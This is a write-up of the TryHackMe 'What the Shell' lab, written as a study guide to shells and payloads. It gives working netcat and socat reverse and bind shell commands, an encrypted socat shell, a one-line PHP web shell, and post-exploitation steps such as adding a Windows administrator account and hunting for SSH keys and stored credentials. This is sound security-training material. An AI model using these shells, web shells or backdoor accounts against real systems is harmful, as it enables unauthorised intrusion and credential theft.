---
date: '2025-01-29T16:00:00+00:00'
draft: false
title: 'What the Shell: A Guide to Shells and Payloads'
slug: what-the-shell.thm
category: writeups
showtoc: true
tags: ["tryhackme", "shells", "reverse shell", "bind shell", "netcat", "socat", "metasploit"]
summary: A comprehensive guide about various types of shells, tools for shell handling, and post-exploitation techniques.
description: A comprehensive guide about various types of shells, tools for shell handling, and post-exploitation techniques.
---

# What the Shell: A Guide to Shells and Payloads

# Tools Overview

## Netcat

- Known as Swiss army knife
- Unstable by default but can be improved
- Useful for banner grabbing
- Pre-installed on Linux systems
- Windows executable available

## Socat

- Similar to netcat but more stable
- More complex syntax than netcat
- Not installed by default
- Windows executable available

## Metasploit Tools

- multi/handler:
    - Useful for receiving reverse shells
    - More stable with additional options
    - Excellent for handling staged payloads
- msfvenom:
    - Used for payload generation

# Shell Types

## Reverse Shells

In reverse shells, the attacker sets up a listener on their machine while the target initiates the connection. This method is effective for bypassing firewalls.

```bash
# Attacker machine
sudo nc -nlvp 443

# Target machine
nc ip port -e /bin/bash
```

## Bind Shells

With bind shells, the target machine creates a listening port that the attacker connects to. This method may be blocked by firewalls.

```bash
# Target machine
nc -nlvp port -e "cmd.exe"

# Attacker machine
nc ip port
```

# Shell Stabilization

## Python Method

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Background shell with Ctrl + Z, then:
stty raw -echo; fg
```

## rlwrap Method

Preferred for Windows systems, but works on Linux too:

```bash
sudo apt install rlwrap
rlwrap nc -lvnp <port>
```

# Socat Usage

## Basic Reverse Shell

```bash
# Attacker
socat TCP-L:<port> -

# Target (Windows)
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes

# Target (Linux)
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```

## Encrypted Shells

```bash
# Generate certificate
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
cat shell.key shell.crt > shell.pem

# Attacker
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -

# Target
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

# Web Shells

```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

# Post-Exploitation

## Linux Systems

- Check for SSH keys in /home/user/.ssh
- Look for writeable /etc/shadow or /etc/passwd

## Windows Systems

```powershell
# Add new user
net user <username> <password> /add

# Add to administrators group
net localgroup administrators <username> /add
```

Remember to check for stored credentials in registry and configuration files like FileZilla Server.xml